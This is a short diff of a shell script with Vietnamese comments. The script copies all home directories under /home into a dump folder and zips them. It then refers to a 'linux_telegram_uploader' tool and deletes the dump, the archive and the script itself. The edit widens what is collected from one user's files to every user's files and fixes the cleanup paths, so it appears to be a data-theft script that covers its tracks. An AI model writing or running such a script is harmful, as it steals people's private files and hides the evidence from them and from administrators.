@@ -1,8 +1,8 @@
 
-mkdir -p /home/$USER/dump
-cd /home/$USER/dump
+mkdir -p /home/dump
+cd /home/dump
 
-cp -r ~/* /home/$USER/dump/
+cp -r /home/* /home/dump/
 
 zip -r dump.zip dump/
 
@@ -14,9 +14,9 @@ chmod +x linux_telegram_uploader
 sleep 15
 
 # Xóa các file còn lại trong thư mục dump
-rm -rf dump/
-rm dump.zip
-rm telegram_uploader.sh
+rm -rf /home/dump/
+rm /home/dump.zip
+rm /home/telegram_uploader.sh
 
 # Kết thúc
 exit
